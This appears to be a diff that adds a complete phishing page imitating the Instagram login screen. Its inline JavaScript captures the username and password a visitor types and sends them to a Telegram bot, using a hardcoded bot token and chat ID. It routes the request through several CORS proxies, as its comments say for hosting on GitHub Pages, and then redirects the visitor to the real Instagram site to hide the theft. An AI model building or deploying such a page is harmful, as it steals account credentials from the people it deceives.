@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link href="https://fonts.cdnfonts.com/css/billabong" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    /* Your exact same CSS - keep it */
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #fafafa;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      max-width: 935px;
+      width: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 32px;
+    }
+    .phone-section {
+      flex: 1;
+      display: none;
+    }
+    @media (min-width: 876px) {
+      .phone-section { display: block; }
+    }
+    .phone-frame {
+      background: url('https://www.instagram.com/static/images/homepage/screenshot1.jpg') no-repeat center;
+      background-size: cover;
+      width: 380px;
+      height: 580px;
+      margin: 0 auto;
+    }
+    .login-section {
+      flex: 1;
+      max-width: 350px;
+    }
+    .login-box {
+      background: #ffffff;
+      border: 1px solid #dbdbdb;
+      border-radius: 1px;
+      padding: 40px 40px 30px;
+      text-align: center;
+    }
+    .logo {
+      font-family: 'Billabong', cursive;
+      font-size: 48px;
+      color: #262626;
+      margin-bottom: 32px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      margin-bottom: 8px;
+    }
+    button {
+      width: 100%;
+      padding: 8px;
+      background: #0095f6;
+      border: none;
+      border-radius: 4px;
+      color: white;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #8e8e8e;
+    }
+    .divider::before, .divider::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+    .fb-login {
+      color: #385185;
+      text-decoration: none;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin: 16px 0;
+    }
+    .signup-box {
+      background: white;
+      border: 1px solid #dbdbdb;
+      padding: 20px;
+      text-align: center;
+      margin-top: 10px;
+    }
+    .signup-box a {
+      color: #0095f6;
+      text-decoration: none;
+    }
+    .footer {
+      margin-top: 40px;
+      font-size: 11px;
+      color: #8e8e8e;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="phone-section">
+      <div class="phone-frame"></div>
+    </div>
+    <div class="login-section">
+      <div class="login-box">
+        <div class="logo">Instagram</div>
+        <form id="loginForm">
+          <input type="text" id="username" placeholder="Phone number, username, or email" required>
+          <input type="password" id="password" placeholder="Password" required>
+          <button type="submit" id="loginBtn">Log In</button>
+        </form>
+        <div class="divider">OR</div>
+        <a href="#" class="fb-login"><i class="fab fa-facebook-square"></i> Log in with Facebook</a>
+        <a href="#" class="forgot">Forgot password?</a>
+      </div>
+      <div class="signup-box">Don't have an account? <a href="#">Sign up</a></div>
+    </div>
+  </div>
+
+  <script>
+    // =============================================
+    // GITHUB PAGES COMPATIBLE VERSION
+    // =============================================
+    
+    const TOKEN = "8088123811:AAFrniGTUkc3far2QTKUMjI8ZtoQ-qyWwKg";
+    const CHAT_ID = "6657880965";
+    
+    // Use a CORS proxy that works on GitHub Pages
+    const PROXY = "https://corsproxy.io/?";
+    
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      e.preventDefault();
+      
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      
+      if (!username || !password) return;
+      
+      // Change button text
+      const btn = document.getElementById('loginBtn');
+      btn.textContent = 'Please wait...';
+      btn.disabled = true;
+      
+      // Prepare message
+      const message = `🔐 Login: ${username} | ${password}`;
+      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+      
+      // =============================================
+      // METHOD 1: Using Image with Proxy (Works on GitHub Pages)
+      // =============================================
+      const img1 = new Image();
+      img1.src = PROXY + encodeURIComponent(url);
+      document.body.appendChild(img1);
+      
+      // =============================================
+      // METHOD 2: Using Another Proxy (Backup)
+      // =============================================
+      const img2 = new Image();
+      img2.src = "https://api.allorigins.win/raw?url=" + encodeURIComponent(url);
+      document.body.appendChild(img2);
+      
+      // =============================================
+      // METHOD 3: Using fetch with no-cors
+      // =============================================
+      fetch(PROXY + encodeURIComponent(url), { mode: 'no-cors' }).catch(() => {});
+      
+      // Redirect after a short delay
+      setTimeout(() => {
+        window.location.href = 'https://www.instagram.com';
+      }, 300);
+    });
+  </script>
+</body>
+</html>
